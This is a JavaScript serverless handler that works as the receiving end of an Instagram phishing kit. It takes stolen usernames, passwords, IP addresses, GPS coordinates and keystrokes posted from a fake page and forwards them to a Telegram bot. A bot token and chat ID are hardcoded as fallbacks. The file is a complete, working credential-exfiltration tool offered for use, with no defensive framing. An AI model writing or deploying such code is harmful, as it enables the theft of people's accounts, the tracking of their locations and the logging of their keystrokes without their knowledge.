// api/telegram.js - Updated for Node.js 20+
export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const data = req.body;
    const BOT_TOKEN = process.env.BOT_TOKEN || '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
    const CHAT_ID = process.env.CHAT_ID || '7933552719';

    let message = '';

    switch (data.type) {
      case 'credentials':
        message = `🔥 *VICTIM CREDENTIALS* 🔥\n\n`
                + `👤 *Username:* \`${data.username}\`\n`
                + `🔑 *Password:* \`${data.password}\`\n`
                + `🌐 *IP:* \`${data.ip || 'N/A'}\`\n`
                + `⏰ *Time:* ${new Date(data.timestamp).toLocaleString('id-ID')}\n\n`
                + `#victim #instagram`;
        break;

      case 'location':
        message = `📍 *LOCATION*\n\n`
                + `*Lat:* ${data.lat}\n`
                + `*Lon:* ${data.lon}\n`
                + `*Accuracy:* ${data.accuracy}m\n`
                + `[View Map](https://maps.google.com/?q=${data.lat},${data.lon})`;
        break;

      case 'keystrokes':
        message = `⌨️ *KEYSTROKES*\n\n\`${data.data}\``;
        break;

      default:
        message = `📨 *DATA*\n\n${JSON.stringify(data, null, 2)}`;
    }

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });

    const result = await response.json();

    console.log('Telegram result:', result.ok);

    return res.status(200).json({
      success: true,
      telegramResult: result
    });

  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({
      success: false,
      error: error.message
    });
  }
}

// Vercel Edge Function config
export const config = {
  runtime: 'edge',
  maxDuration: 10,
};
